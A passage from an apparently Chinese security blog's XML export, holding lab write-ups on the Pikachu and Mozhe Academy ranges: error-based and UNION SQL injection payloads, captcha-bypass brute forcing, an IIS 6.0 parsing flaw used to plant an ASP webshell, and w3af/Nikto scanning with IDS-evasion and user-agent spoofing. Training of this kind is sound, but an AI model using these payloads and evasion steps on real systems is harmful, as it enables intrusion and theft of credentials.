updatexml(1,concat(0x7e,(select username from users limit 0,1)),0)# 得到users表的用户名分别为:admin,pikachu,test 查看其对应的密码1123&apos; and updatexml(1,concat(0x7e,(select password from users where username=&apos;admin&apos; limit 0,1)),0)# 得到admin用户的经过MD5加密的值,解密为123456 extractvalue()函数使用方法extractvalue()函数:从目标XML中返回包含所查询值的字符串语法:ExtractValue(xml_document,xpath_string)第一个参数:XML_document是string格式,为XML文档对象的名称,文中为Doc第二个参数:XPath_string(Xpath格式的字符串)XPath定位必须是有效的,否则会发生错误 基于updatexml()报错进行信息获取获取数据库信息:11&apos; and extractvalue (0,concat(0x7e,database()))# 其后续操作与updatexml函数操作一致,我就不继续写下去啦 floor()函数使用方法floor():MySQL中用来取整的函数.使用floor函数必须要满足三个条件:其SQL语句中存在count函数,rand函数,group by 这三个值才可以使用其payload为:1xxx&apos; and (select 2 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a )# 关于floor报错原理分析请参考此篇文章:http://blog.51cto.com/chichu/2051375]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>靶机实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pikachu靶机实战之暴力破解]]></title>
    <url>%2F2019%2F01%2F02%2Fpikachu%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[态度决定高度! 靶机简介Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。 是个适合新手练习的靶场Pikachu上的漏洞类型列表如下：Burt Force(暴力破解漏洞)XSS(跨站脚本漏洞)CSRF(跨站请求伪造)SQL-Inject(SQL注入漏洞)RCE(远程命令/代码执行)Files Inclusion(文件包含漏洞)Unsafe file downloads(不安全的文件下载)Unsafe file uploads(不安全的文件上传)Over Permisson(越权漏洞)../../../(目录遍历)I can see your ABC(敏感信息泄露)PHP反序列化漏洞XXE(XML External Entity attack)不安全的URL重定向SSRF(Server-Side Request Forgery)More…(找找看?..有彩蛋!)管理工具里面提供了一个简易的xss管理后台,供你测试钓鱼和捞cookie~ 安装和使用Pikachu使用世界上最好的语言PHP进行开发-_-，数据库使用的是mysql，因此运行Pikachu你需要提前安装好”PHP+MYSQL+中间件（如apache,nginx等）”的基础环境，建议在你的测试环境直接使用 一些集成软件来搭建这些基础环境,比如XAMPP,WAMP等,作为一个搞安全的人,这些东西对你来说应该不是什么难事。接下来:–&gt;把下载下来的pikachu文件夹放到web服务器根目录下;–&gt;根据实际情况修改inc/config.inc.php里面的数据库连接配置;–&gt;访问 http://x.x.x.x/pikachu ,会有一个红色的热情提示”欢迎使用,pikachu还没有初始化，点击进行初始化安装!”,点击即可完成安装。 暴力破解实验Burte Force（暴力破解）概述 暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：1.是否要求用户设置复杂的密码；2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；4.是否采用了双因素认证；…等等。 基于表单的暴力破解我们使用burpsuite进行暴力破解,由于前端没有验证码等防范暴力破解的措施,我们直接输入用户名密码,发送到burpsuite的intruder模块,一般用户名为admin,administrator(Windows环境)或者root(Linux环境),我设置admin为用户名,对其密码进行爆破 不安全的验证码-on client常见问题验证码作用:1,防止暴力破解2,防止机器恶意注册 验证码的认证流程:客户端request登录页面,后台生成验证码1,后台使用算法生成图片,并将图片response给客户端2,同时将算法生成的值全局赋值存到session中. 校验验证码:1,客户端将认证信息和验证码一同提交2,后台对提交的验证码和session里面的进行比较 客户端重新刷新页面,再次生出新的验证码验证码算法中一般包含随机函数,所以每次刷新都会改变 不安全的客户端验证码常见问题:1,使用前端js实现验证码(纸老虎)2,将验证码在cookie中泄露,容易被获取3,将验证码在前端源代码中泄露,容易被获取 开始试验:首先尝试输入错误的用户名,密码+错误的验证码,点击登录页面返回验证码不正确然后输入错误的用户名,密码+正确的验证码,点击登录页面返回用户名或者密码不正确当输入错误的用户名,密码+空验证码,点击登录页面提示验证码不能为空,表示服务端对验证码的有效性做过校验,一切逻辑正常当查看源代码的时候发现是前台生出的验证码如果后台不对前台输入的验证码进行校验的话,那么通过burp代理(客户端和服务端中间人)即可绕过验证码我们使用burp抓包看看是否对输入的验证码进行校验,结果是用户名或者密码不存在然后换个账号密码继续发包,判断服务器端是否对用户前端输入的验证码进行校验还是用户名密码不正确,但并未返回验证码不正确 我们都知道当用户输入账号密码和验证码之后,服务器端首先验证验证码是否正确,如果不正确直接返回验证码不正确,如果验证码正确,那么服务器端会接着验证用户名密码是否正确.我们刚刚的结果是用户名或者密码不存在,表示验证码验证那一关我们是完美的避过了,然后再爆破用户名密码即可爆破出用户名为:admin/123456pikachu/000000test/abc123 不安全的验证码-on server常见问题不安全的验证码-on server常见问题1,验证码在后台不过期,导致可以长期被使用2,验证码校验不严格,逻辑出现问题3,验证码设计的太过简单和有规律,容易被猜解 针对于第一个验证码在后台不过期的漏洞,开始实验首先尝试输入错误的用户名,密码+错误的验证码,点击登录burp抓返回包页面返回验证码不正确然后输入错误的用户名,密码+正确的验证码,点击登录burp抓返回包页面返回用户名或者密码不正确当输入错误的用户名,密码+空验证码,点击登录burp抓返回包页面提示验证码不能为空,表示服务端对验证码的有效性做过校验,一切逻辑正常 当刷新页面,客户端向服务器发出请求,生出新的验证码,同时后台会在session中将这个验证码存下来(存下来的目的是为了对用户输入的验证码进行验证),所以当输入错误的验证码或者空的验证码的时候都会提示验证码错误,只有正确的验证码才可以被服务器接受 但是如果这个验证码在后台不过期或者过期时间较长,足够我们去爆破用户名密码,那么漏洞就产生了.1,首先先正常提交用户名密码验证码,然后发送到repeater模块中2,关闭burp代理功能,刷新页面,会生出新的验证码,记住新的验证码3,在repeater模块中将新的验证码写入,重放发现其提示是用户名密码错误4,将账户名密码替换,试试验证码还有没有效5,因为无论怎么替换用户名和密码,验证码都正确,所以那么这一关我们是完美的避过了,然后再爆破用户名密码即可 漏洞分析:其漏洞根本在于服务器端未设定生出验证码的session的过期时间,那么按照PHP语言默认session的过期时间为24分钟,这个验证码24分钟内都是有效的,那么也足够黑客进行暴力破解啦 修复方法:法一,在php.ini配置文件中设置过期时间法二,在代码中设定该验证码验证过一次之后,就将其session进行销毁(更有效) token防止暴力破解?曾经网上有人说可以使用token防止暴力破解,其原理就是当用户打开页面时,后端生出一个token值,token会被存放到session中去,同时服务端会将token发送到前端的表单中,当用户输入账号密码点击确认的时候,客户端会将账号密码+token一起发送到服务器端,当刷新页面之后,token即就会变化 但是token会被显示在前端的表单中,黑客完全可以通过代码获取表单的token,然后配合暴力破解即可]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>靶机实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[凌云志]]></title>
    <url>%2F2018%2F11%2F07%2F%E5%87%8C%E4%BA%91%E5%BF%97%2F</url>
    <content type="text"><![CDATA[雨落惊得杨柳斜，少年蹒跚几经劫。过荆棘如履平地，流血依旧笑欢颜。千难万阻志不灭，惧他风雪万里渊？他日我得凌云志，日晖逊色半边天！]]></content>
      <categories>
        <category>励志</category>
      </categories>
      <tags>
        <tag>励志</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IIS6.0容器之解析漏洞复现]]></title>
    <url>%2F2018%2F10%2F30%2FIIS6.0%E5%AE%B9%E5%99%A8%E4%B9%8B%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[态度决定高度! 漏洞简介解析漏洞是指web服务器因对HTTP请求处理不当导致将非可执行的脚本,文件等当作可执行的脚本去执行.该漏洞一般配合web容器(iis,nginx,apache,tomcat等)的文件上传功能去使用,以获取服务器的权限. IIS5.X/6.X解析漏洞对于IIS服务器5版本和6版本存在两个解析漏洞,分别为目录解析和文件解析 目录解析简介:在网站下建立文件夹的名称中以.asp或.asa等作为后缀的文件夹,其目录内任何扩展名的文件都被IIS当作asp可执行文件去解析并执行.举个栗子:/xx.asp/xx.jpg为xx.asp目录下存在xx.jpg文件,但将会被IIS解析成asp文件去执行,与原文件的后缀无关. 实验:我们这里使用墨者学院提供的实验环境去复现该漏洞执行过程.(墨者学院解析漏洞链接) 我们在界面先上传一个普通文件,通过F12控制台查看消息头,得知目标服务器为Microsoft-IIS/6.0,也有需要上传的地方,我们可以试试目录解析漏洞.我们先随意上传一个文件,观其url发现是asp脚本构造的页面,然后在本地制作一个asp的一句话木马保存到一个文件中,然后打开burpsuite的代理功能去进行抓包修改我们在发送的POST请求中发现刚刚发送的asp.txt被保存的第二个upload文件下,为了让其执行,所以我们在第二个upload后面加入/webshell.asp文件,这样就能将asp.txt这个一句话木马放入webshell.asp中,便可以利用解析漏洞直接将asp.txt当作asp脚本去执行在burp中转发浏览器显示成功上传,并列出上传的地址成功的将asp一句话木马上传到目标服务器中,这样我们可以使用中国菜刀去远程连接 文件解析/后缀解析简介:在IIS6.0下,分号后面的内容不被解析,举个栗子,xx.asp;.jpg将会当作xx.asp去解析执行.IIS6.0 默认的可执行文件除了.asp，还包含这三种：.asa .cdx .cer. 例如：test.asa 、 test.cdx 、 test.cer 实验:继续使用刚刚的环境,我们将刚刚的asp木马文件名修改为webshell.asp;.txt,因为该网站不允许上传以asp作为后缀的文件名,所以我们使用.txt后缀,但分号后面的内容将会被IIS过滤不去解析,所以这就是个asp脚本.我们将文件直接上传到upload目录下,然后使用菜刀连接,也是可以连接上的.https://i.loli.net/2018/10/30/5bd7346bd84d0.png当然顺便也能找到所需要的key值]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>手工挖掘漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[墨者学院--手工注入mysql数据库实例]]></title>
    <url>%2F2018%2F10%2F23%2F%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%9E%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[发现漏洞 开启墨者靶场环境,发现此界面,在点击登陆下方的通知之后惊奇的看到存在参数id,可以试试通过传递SQL语句获取数据库信息. 注入测试我们可以试试1=1和1=2大法,输入在参数id=1后面加入1=1进行逻辑判断显示正常,然后换1=2,因为1=2为一个假命题,如果能插入到数据库进行逻辑判断,那么由于该语句错误,数据库查询不到任何信息,界面就不会显示任何信息根据这种情况可以大概的判断出该网站很大可能存在SQL注入漏洞.我们可以大概的猜测出该web页面中背后的SQL语句为 1select column1,column2..... from table where id=$_GET[&quot;id&quot;] 然后通过order by判断出该SQL语句查询有多少列(或者说查询多少个字段),order by用于对筛选出来的结果按照列(关键字)进行排序,对于多列的时候，先按照第一个column name排序，如果第一个column name相同,则按照第二个column name排序,我们输入: 12http://219.153.49.228:42182/new_list.php?id=1 order by 1,2,3,4,5#假设该SQL语句中查询了5个关键字,如果没报错,那么表示所查询的关键字大于或者等于5,如果报错表示查询的小于5 出现报错,表示所选择的关键字小于5,我们换成3,可以正确显示其界面,换成4也可以正常显示,所以可以得出所选择的关键字个数为4.那么其SQL语句为: 1select column1,column2,column3,column4 from table where id=$_GET(&quot;id&quot;) 接下来判断在页面中可以显示的关键字其SQL语句为: 1select column1,column2,column3,column4 from table where id=5 union select 1,2,3,4 注:由上面的操作得出该SQL语句查询4个关键字,我们将id=5,则对于第一个SQL语句由于不满足where条件而不显示其内容,所以执行第二条语句,select 1,2,3,4就是判断在页面中显示的是哪些关键字.)由这个信息可以得出显示的是第二个和第三个字段的内容 获取数据库信息我们将第二个和第三个字段换成MySQL数据库中的函数,即可获取其数据库的信息使用user()函数可以得知当前数据库的使用者使用database()函数可以得知当时数据库的名称)该MYSQL数据库名叫mozhe_Discuz_StormGroup,当前使用者为root在MYSQL数据库中有一个数据库叫information_schema数据库,它提供了访问数据库元数据的方式。什么是元数据呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。可以简单的理解为数据词典或者系统目录. )其命令为: 12http://219.153.49.228:42182/new_list.php?id= 5 union select 1, schema_name ,3,4 from information_schema.schemata limit 0,1 注:limit 0,1表示从第0行起,取第一行数据,第一行为information_schema,举个例子:)limit 0,1即就是指dvwa数据库limit1,1即就是information_schema数据库回到原来的注入问题,我们将limit 0,1换成limit 1,1 limit 2,2 limit 3,3 limit 4,4 information_schema,mozhe_Discuz_StormGroup,mysql,performance_schema,sys这五个数据库,当输入limit5,5页面没有内容表示目前拥有五个数据库.然后枚举数据库中的数据表注入的URL为: 1http://219.153.49.228:43635/new_list.php?id=5 union select 1,table_name,3,4 from information_schema.tables where table_schema=&apos;mozhe_Discuz_StormGroup&apos; limit 0,1 获得mozhe_Discuz_StormGroup数据库的第一张表为StormGroup_member)将0,1替换为1,1所得到的数据表为notice,替换成2,2则没有显示任何数据表示该数据库只有两张表.所以得到数据库mozhe_Discuz_StormGroup中有两张表为StormGroup_member和notice表,那么我们查其列.1http://219.153.49.228:43635/new_list.php?id=5 union select 1,column_name,3,4 from information_schema.columns where table_name=&apos;StormGroup_member&apos; limit 0,1 得到在其StormGroup_member表下有个列为id,我们将0,1替换成1,1 2,2 3,3 得到的列分别是name,password,status那么可以得知在mozhe_Discuz_StormGroup数据库的StormGroup_member表下有四列分别是id,name,password,status 12http://219.153.49.228:43635/new_list.php?id=5 union select 1,name,3,4 from StormGroup_member limit 0,1 )查找其密码列 1http://219.153.49.228:43635/new_list.php?id=5 union select 1,password,3,4 from StormGroup_member limit 0,1 )将此密码进行MD5解密可得明文密码)然后我们就可以进入后台管理系统啦]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>手工挖掘漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[w3af--命令行模式实验简述]]></title>
    <url>%2F2018%2F10%2F23%2Fw3af-%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%A8%A1%E5%BC%8F%E5%AE%9E%E9%AA%8C%E7%AE%80%E8%BF%B0%2F</url>
    <content type="text"><![CDATA[实验环境:Kali:192.168.128.128Metasploitable:192.168.128.129 安装W3af:简介及安装w3af文档w3af用户接口: ​ console命令行接口 ​ Gui图形界面化接口 ​ API接口 开始操作123456789101112131415161718192021222324root@kali:~/w3af-master# ./w3af_console w3af&gt;&gt;&gt; w3af&gt;&gt;&gt; help #help命令列出当前命令提示符下的可用指令|-----------------------------------------------------------------------------------|| start | Start the scan. 开始扫描 || plugins | Enable and configure plugins. 选择和配置插件 || exploit | Exploit the vulnerability. 使用该模块进行攻击漏洞 || profiles | List and use scan profiles. 列出可以用来扫描的文件 || cleanup | Cleanup before starting a new scan. 在开始新扫描之前进行清理 ||-----------------------------------------------------------------------------------|| help | Display help. Issuing: help [command] , prints more specific help || | about &quot;command&quot; || version | Show w3af version information. 显示w3af版本信息 || keys | Display key shortcuts. 显示关键快捷方式。 ||-----------------------------------------------------------------------------------|| http-settings | Configure the HTTP settings of the framework. 配置框架的HTTP设置。 || misc-settings | Configure w3af misc settings. 配置w3af misc设置 || target | Configure the target URL. 配置目标URL ||-----------------------------------------------------------------------------------|| back | Go to the previous menu. 返回前一目录 || exit | Exit w3af. 退出 ||-----------------------------------------------------------------------------------|| kb | Browse the vulnerabilities stored in the Knowledge Base 浏览存储在知识库中的漏洞 ||----------------------------------------------------------------------------------- 12345678910111213141516171819w3af&gt;&gt;&gt; plugins #输入plugins,进入插件目录的内,w3af/plugins&gt;&gt;&gt; help #输入help显示当前可使用的命令|-----------------------------------------------------------------------------------|| list | List available plugins. ||-----------------------------------------------------------------------------------|| back | Go to the previous menu. || exit | Exit w3af. ||-----------------------------------------------------------------------------------|| output | View, configure and enable output plugins || grep | View, configure and enable grep plugins || evasion | View, configure and enable evasion plugins || audit | View, configure and enable audit plugins || infrastructure | View, configure and enable infrastructure plugins || crawl | View, configure and enable crawl plugins || auth | View, configure and enable auth plugins || mangle | View, configure and enable mangle plugins || bruteforce | View, configure and enable bruteforce plugins ||-----------------------------------------------------------------------------------|w3af/plugins&gt;&gt;&gt; list audit 或者audit #列出audit插件类中的小插件 也可以在图形界面化直观的看清其结构 1234567891011#使用audit模块中的xss脚本攻击,sql注入,本地文件调用这三个插件,可以选用一个,也可以选用多个#那么再次列出时这些插件的Status将会变成Enabled,如果进行扫描,那么就会针对这些漏洞去扫描w3af/plugins&gt;&gt;&gt; audit xss sqli lfi #使用audit模块中的所有插件进行扫描w3af/plugins&gt;&gt;&gt; audit all#输入crawl模块,按两次tab键,可以显示该模块下的插件w3af/plugins&gt;&gt;&gt; crawl genexus_xml wordpress_fingerprint dot_listing content_negotiation robots_txt archive_dot_org ria_enumerator wordnet user_dir sitemap_xml bing_spider dir_file_bruter phpinfo find_dvcs import_results urllist_txt google_spider url_fuzzer find_backdoors web_spider spider_man find_captchas oracle_discovery wsdl_finder wordpress_enumerate_users web_diff dwsync_xml pykto wordpress_fullpathdisclosure phishtank digit_sum open_api dot_ds_store ghdb all config desc w3af/plugins&gt;&gt;&gt; crawl web_spider #选择该模块下的web爬虫模块 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485w3af&gt;&gt;&gt; profiles #进入profiles模块,这个模块用于自定义组合插件,当然w3af自定义了一些组合插件w3af/profiles&gt;&gt;&gt; help|-----------------------------------------------------------------------------------|| use | Use a profile. || list | List available profiles. || save_as | Save the current configuration to a profile. ||-----------------------------------------------------------------------------------|| back | Go to the previous menu. || exit | Exit w3af. ||------------------------------------------------------------------------------w3af/profiles&gt;&gt;&gt; list #列出在profiles模块下的插件w3af/profiles&gt;&gt;&gt; help|-----------------------------------------------------------------------------------|| use | Use a profile. || list | List available profiles. || save_as | Save the current configuration to a profile. #保存当前配置到一个文件内 ||-----------------------------------------------------------------------------------|| back | Go to the previous menu. || exit | Exit w3af. ||-----------------------------------------------------------------------------------|w3af/profiles&gt;&gt;&gt; save_as test #使用save_as后面自定义一个文件名,表示将刚刚的配置存放在test文件内Profile saved.#使用下列命令将test文件独立出来,以便供其他人使用w3af/profiles&gt;&gt;&gt; save_as test self-containedw3af/profiles&gt;&gt;&gt; use test #使用自定义的test文件中的配置进行扫描The plugins configured by the scan profile have been enabled, and their options configured.Please set the target URL(s) and start the scan.w3af/profiles&gt;&gt;&gt; back #返回上一级w3af&gt;&gt;&gt; http-settings #进入http-settings,设置全局参数w3af/config:http-settings&gt;&gt;&gt; help|-----------------------------------------------------------------------------------|| view | List the available options and their values. || set | Set a parameter value. #设置参数值 || save | Save the configured settings. #保存配置 ||-----------------------------------------------------------------------------------|| back | Go to the previous menu. #返回上一目录 || exit | Exit w3af. ||-----------------------------------------------------------------------------------|w3af/config:http-settings&gt;&gt;&gt; view #列出可用的操作和其值|---------------------------------------------------------------------------------#设置随机用户代理浏览器,默认位w3af的代理,容易被管理员查看日志发现w3af/config:http-settings&gt;&gt;&gt; set rand_user_agent True w3af/config:http-settings&gt;&gt;&gt; backThe configuration has been saved.w3af&gt;&gt;&gt; misc-settings #进入misc-setting全局设置选项中w3af/config:misc-settings&gt;&gt;&gt; view #查看需要配置的参数w3af/config:misc-settings&gt;&gt;&gt; set fuzz_url_filenames True #设置对URL中的文件名进行模糊测试(Fuzz)w3af/config:misc-settings&gt;&gt;&gt; backThe configuration has been saved.w3af&gt;&gt;&gt; target #进入target模块,设置目标信息w3af/config:target&gt;&gt;&gt; help #查看在此模块下可以使用的命令|-----------------------------------------------------------------------------------|| view | List the available options and their values. || set | Set a parameter value. || save | Save the configured settings. ||-----------------------------------------------------------------------------------|| back | Go to the previous menu. || exit | Exit w3af. ||-----------------------------------------------------------------------------w3af/config:target&gt;&gt;&gt; view #列出可用的操作|----------------------------------------------------------------------------------|| Setting | Value | Modified | Description ||----------------------------------------------------------------------------------|| target_framework | unknown | | Target programming framework || | | | (unknown/php/asp/asp.net/java/jsp/cfm/ruby/perl) || target | | | A comma separated list of URLs || target_os | unknown | | Target operating system (unknown/unix/windows) ||-----------------------------------------------------------------------------#设置目标URLw3af/config:target&gt;&gt;&gt; set target http://192.168.128.129w3af/config:target&gt;&gt;&gt; set target_os unix #设置目标系统为unixw3af/config:target&gt;&gt;&gt; back #返回上一级目录w3af&gt;&gt;&gt;start #开始扫描 也可以使用w3af中集成的脚本去进行扫描1234567891011121314151617181920212223242526272829root@kali:~/w3af-master# cd scripts/root@kali:~/w3af-master/scripts# lsallowed_methods.w3af login_brute_form_GET.w3afall.w3af login_brute_password_only.w3afauth_detailed.w3af mangle_request.w3afbing_spider.w3af mangle_response.w3afblind_sqli_detection.w3af os_commanding-lnx-vdaemon.w3afcookie_fuzzing.w3af os_commanding-lnx-w3afAgent.w3afcross_domain.w3af os_commanding_shell.w3afcsrf.w3af os_commanding.w3afdav_shell.w3af php_sca-payload.w3afdetect_transparent_proxy.w3af profile-fast_scan.w3afdigit_sum.w3af remote_file_include_local_ws.w3afdvwa.w3af remote_file_include_proxy.w3afeval_shell.w3af remote_file_include_shell.w3afeval.w3af remote_file_include_shell-xss.w3afexploit_all.w3af remote_file_include_w3af_site.w3afexploit_fast.w3af spider_man.w3affilename_xss.w3af sqli.w3affile_upload_shell.w3af sqlmap_exploit_int.w3affrontpage_version.w3af targets_from_file.w3afheader_fuzzing.w3af web_spider-ignore_regex.w3afhtml_output.w3af web_spider-only_forward.w3aflist_all_plugins.w3af web_spider.w3aflocal_file_include-payload.w3af xss_simple.w3aflocal_file_include.w3af xss_stored.w3af#参数-s表示指定具体的脚本去进行扫描,但需要首先去进入该脚本进行配置目标信息,然后调用w3af的console接口去扫描是否存在sql注入root@kali:~/w3af-master# ./w3af_console -s scripts/sqli.w3af]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WEB扫描工具之Nikto实践]]></title>
    <url>%2F2018%2F10%2F23%2FWEB%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E4%B9%8BNikto%E5%AE%9E%E8%B7%B5-1%2F</url>
    <content type="text"><![CDATA[实验环境:kali:192.168.136.128/24 Metasploitable:192.168.136.129/24 Nikto简介Web扫描工具大部分都支持两种扫描模式:代理截断模式和主动扫描模式Nikto:是一个Web服务器扫描程序，主要是去检查软件版本信息,搜索存在的安全隐患的文件,服务器配置漏洞,Web Application层面的安全隐患等,也能避免404误判（原因：很多服务器不遵循RFC标准，对于不存在的对象返回200响应码）；依据响应文件内容判断，不同扩展名的文件404响应内容不同；去时间信息后的内容取MD5值；不建议用-no404参数（-no404参数指去不校验404误判,它还可以捕获并打印收到的任何cookie. Wiki百科对其功能的介绍 Nikto is an Open Source (GPL) web server scanner which performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/CGIs, checks for outdated versions of over 1250 servers, and version specific problems on over 270 servers. It also checks for server configuration items such as the presence of multiple index files, HTTP server options, and will attempt to identify installed web servers and software. Scan items and plugins are frequently updated and can be automatically updated.Nikto是一个开源（GPL）Web服务器扫描程序，可针对多个项目对Web服务器执行全面测试，包括超过6700个潜在危险文件/ CGI，检查超过1250台服务器的过期版本，以及超过270台服务器上的版本特定问题。它还会检查服务器配置项，例如是否存在多个索引文件，HTTP服务器选项，并将尝试识别已安装的Web服务器和软件。扫描项目和插件经常更新，可以自动更新。 开始操作12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576root@kali:~# nikto -update #从CIRT.net网站更新nikto的数据库和插件root@kali:~# nikto -list-plugins #列出nikto内列出所有可用的插件#扫描目标主机的Web层面的漏洞,格式为:nikto -host 目标服务器URL(可以是多个URL)root@kali:~# nikto -host http://192.168.136.129 #也可以使用nikto -host 目标IP地址 -port 扫描端口,和上一条命令效果一致root@kali:~# nikto -host 192.168.136.129 -port 80,443 #使用ssl模式去扫描目标系统的信息root@kali:~# nikto -host www.baidu.com -port 443 -ssl #扫描多个目标,将目标地址存放在某个文本文档中,#目标地址格式为:http://主机名:端口或者IP地址:端口或者直接是IP地址root@kali:~# nikto -host host.txt #使用nmap扫描目标网段的80端口,将开放80端口的主机IP筛选出后传送给nikto进行扫描web服务漏洞,#参数-oG表示输出便于通过bash或者perl处理的格式,非xmlroot@kali:~# nmap -p80 192.168.136.129/24 -oG - | nikto -host - #nikto支持代理功能root@kali:~# nikto -host 192.168.1.1 -useproxy http://localhost:8087Nikto互动功能:Nikto包含几个可在活动扫描期间更改的选项，前提是它在提供POSIX支持的系统上运行，其中包括unix和其他一些操作系统。在没有POSIX支持的系统上，将以静默方式禁用这些功能。在主动扫描期间，按下面任何一个键将打开或关闭列出的功能或执行列出的操作。请注意，这些区分大小写。 SPACE - 报告当前扫描状态 v - 打开/关闭详细模式 d - 打开/关闭调试模式,极其详细信息 e - 打开/关闭错误报告 p - 打开/关闭进度报告 r - 打开/关闭重定向显示 c - 打开/关闭cookie显示 o - 打开/关闭OK显示 a - 打开/关闭验证显示 q - 退出 N - 下一个主持人 P - 暂停,大写Pcookie简介[cookie wiki](https://zh.wikipedia.org/wiki/Cookie)因为HTTP协议是无状态的，即服务器不知道用户上一次做了什么，这严重阻碍了交互式Web应用程序的实现。在典型的网上购物场景中，用户浏览了几个页面，买了一盒饼干和两瓶饮料。最后结帐时，由于HTTP的无状态性，不通过额外的手段，服务器并不知道用户到底买了什么，所以Cookie就是用来绕开HTTP的无状态性的“额外手段”之一。服务器可以设置或读取Cookies中包含信息，借此维护用户跟服务器会话中的状态。在刚才的购物场景中，当用户选购了第一项商品，服务器在向用户发送网页的同时，还发送了一段Cookie，记录着那项商品的信息。当用户访问另一个页面，浏览器会把Cookie发送给服务器，于是服务器知道他之前选购了什么。用户继续选购饮料，服务器就在原来那段Cookie里追加新的商品信息。结帐时，服务器读取发送来的Cookie就行了。Cookie另一个典型的应用是当登录一个网站时，网站往往会请求用户输入用户名和密码，并且用户可以勾选“下次自动登录”。如果勾选了，那么下次访问同一网站时，用户会发现没输入用户名和密码就已经登录了。这正是因为前一次登录时，服务器发送了包含登录凭据（用户名加密码的某种加密形式）的Cookie到用户的硬盘上。第二次登录时，如果该Cookie尚未到期，浏览器会发送该Cookie，服务器验证凭据，于是不必输入用户名和密码就让用户登录了。修改nikto的配置文件,写入cookie信息,即可扫描那些需要身份认证才可以访问的页面root@kali:~# vim /etc/nikto.conf #编辑其配置文件修改USERAGENT,防止扫描的时候被系统管理员发现(我目前设置为win10的浏览器)USERAGENT=Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko (Evasions:@EVASIONS) (Test:@TESTID)设置用户代理的方法:使用火狐浏览器登陆[User-Agent Switcher](https://addons.mozilla.org/zh-CN/firefox/addon/user-agent-switcher-revived/?src=search),添加到Firefox,在右上角打开图标! 123456789101112131415161718192021在STATIC-COOKIE这个命令下取消注释,输入cookie信息,格式为&quot;cookie name1&quot;=&quot;value&quot;;&quot;cookie name2&quot;=&quot;value&quot;(可以设置多个cookie) STATIC-COOKIE=&quot;PHPSESSION&quot;=&quot;9eb59920d99db2871254303ec47b3460&quot;;&quot;security&quot;=&quot;high&quot;(这是我的cookie,需要自行抓取cookie信息) 然后保存退出,在终端开始用扫描(cookie扫描),将会获得更有效的扫描结果# nikto加参数-evasion表示使用LibWhisker中对IDS的躲避技术,防止被发现,root@kali:~# nikto -host http://192.168.136.129 可使用以下几种类型: • 1 随机URL编码(非UTF-8方式) • 2 自选择路径(/./) • 3 过早结束的URL • 4 优先考虑长随机字符串• 5 参数欺骗 • 6 使用TAB作为命令的分隔符 • 7 使用变化的URL • 8 使用Windows路径分隔符&quot;\&quot; #使用第一种,第六种,第七种方法,自行搭配root@kali:~# nikto -host http://192.168.136.129 -evasion 167]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手动挖掘之默认安装漏洞]]></title>
    <url>%2F2018%2F10%2F23%2F%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98%E4%B9%8B%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85%E6%BC%8F%E6%B4%9E-1%2F</url>
